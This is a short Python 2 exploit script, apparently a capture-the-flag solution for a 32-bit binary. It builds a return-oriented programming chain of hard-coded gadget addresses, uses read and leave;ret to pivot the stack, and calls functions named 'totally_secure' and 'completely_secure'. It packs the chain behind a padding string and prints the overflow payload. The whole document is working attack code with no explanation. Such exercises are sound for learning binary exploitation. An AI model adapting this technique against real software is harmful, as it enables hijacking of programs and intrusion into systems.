import struct



totally_secure = 0x08048471
completely_secure = 0x0804842b

popret = 0x80482d1
pop4ret = 0x804851c
pop3ret = 0x804851d
pop2ret = 0x804851e
addesp_12 = 0x80482ce
addesp_16 = 0x8048395
addesp_44 = 0x8048519
trash = 0xaaaaaaaa
read = 0x80482f0
new_stack = 0x08048020
leave_ret = 0x08048680
new_ebp = new_stack

chain = [
    read,
    leave_ret,
    0,
    new_stack,
    0x200,
    trash,
    popret,
    0x08048471,
    popret,
    new_stack,
    0x0804842b,
    popret,
    trash,
    trash,
    trash,
    trash,
    trash,
    trash,
    trash,
]
trash = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa"
payload = trash + struct.pack("I", new_ebp) + "".join([struct.pack("I", i) for i in chain])
print payload
